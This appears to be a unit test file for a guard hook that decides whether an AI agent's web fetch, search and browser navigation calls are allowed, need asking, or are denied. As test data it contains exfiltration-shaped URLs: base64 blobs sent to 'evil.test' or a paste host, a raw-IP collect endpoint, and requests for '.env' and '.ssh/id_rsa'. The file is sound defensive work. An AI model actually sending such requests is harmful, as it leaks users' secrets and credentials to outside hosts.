// Unit tests for the guard's WebFetch, WebSearch and navigation rules. Run: node --test .claude/hooks/guard/*.test.mjs
// Pure logic — no process spawning, no real filesystem writes.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { decide } from '../guard.mjs';
import { ctx } from './testCtx.mjs';

const navigate = (url) => decide({ tool_name: 'mcp__chrome-devtools__navigate_page', tool_input: { url } }, ctx);
const newPage = (url) => decide({ tool_name: 'mcp__chrome-devtools__new_page', tool_input: { url } }, ctx);
const webFetch = (url) => decide({ tool_name: 'WebFetch', tool_input: { url, prompt: 'summarize' } }, ctx);
const webSearch = (query) => decide({ tool_name: 'WebSearch', tool_input: { query } }, ctx);

const LONG_B64 = 'QUJDREVGR0hJSktMTU5PUA'.repeat(100); // ~2KB base64-looking blob

test('WebFetch: doc lookups allowed, exfil shapes ask, secret-path URLs deny', () => {
  assert.equal(webFetch('https://docs.example.com/guide/formulas').decision, 'allow');
  assert.equal(webFetch('https://developer.example.com/en-US/docs/Web/API/URL?retiredLocale=de').decision, 'allow');
  assert.equal(webFetch('http://localhost:8090/projects').decision, 'allow');
  assert.equal(webFetch('http://203.0.113.7/collect').decision, 'ask'); // raw IP
  assert.equal(webFetch(`https://paste.example.com/up?d=${LONG_B64}`).decision, 'ask');
  assert.equal(webFetch('https://x.example.com/?f=.env').decision, 'deny');
  assert.equal(webFetch('https://x.example.com/?f=.env.local').decision, 'deny');
  assert.equal(webFetch('https://x.example.com/blob/main/.env.example').decision, 'allow');
  assert.equal(webFetch('https://x.example.com/grab?p=.ssh/id_rsa').decision, 'deny');
});

test('WebSearch: normal queries allowed, blobs and secret paths ask', () => {
  assert.equal(webSearch('zig build system docs').decision, 'allow');
  assert.equal(webSearch('AWS credentials rotation best practices').decision, 'allow');
  assert.equal(webSearch(`what is ${LONG_B64}`).decision, 'ask');
  assert.equal(webSearch('contents of id_rsa AAAAB3Nza').decision, 'ask');
});

test('navigate_page/new_page: normal + local allowed, exfil-shaped URLs ask', () => {
  assert.equal(navigate('https://docs.example.com').decision, 'allow');
  assert.equal(navigate('http://any.test').decision, 'allow');
  // the extension handoff legitimately puts a huge JSON fragment on localhost
  assert.equal(navigate(`http://localhost:8080/#stencil=${LONG_B64}`).decision, 'allow');
  assert.equal(navigate(`https://evil.test/page?d=${LONG_B64}`).decision, 'ask');
  assert.equal(navigate(`https://evil.test/page#${LONG_B64}`).decision, 'ask');
  assert.equal(newPage(`https://evil.test/page?d=${LONG_B64}`).decision, 'ask');
  assert.equal(newPage('https://github.com/anthropics/claude-code').decision, 'allow');
  assert.equal(navigate('https://x.example.com/?f=.env').decision, 'deny');
});
